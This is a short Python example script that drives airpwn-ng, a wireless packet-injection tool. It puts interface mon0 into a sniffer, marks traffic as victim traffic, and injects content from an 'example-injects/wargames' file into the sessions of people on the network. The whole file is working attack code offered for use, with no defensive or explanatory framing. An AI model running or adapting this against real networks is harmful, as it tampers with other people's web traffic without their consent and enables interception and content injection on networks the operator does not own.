import lib.airpwn_ng as AIRPWN_NG

#EXAMPLE API
#SAME AS ./airpwn-ng -m mon0 -i mon0 --injection example-injects/wargames
vp=AIRPWN_NG.VictimParameters(inject_file="example-injects/wargames")
ph=AIRPWN_NG.PacketHandler(i="mon0",victim_parameters=vp)
snif=AIRPWN_NG.Sniffer(ph,m="mon0")
snif.threaded_sniff()
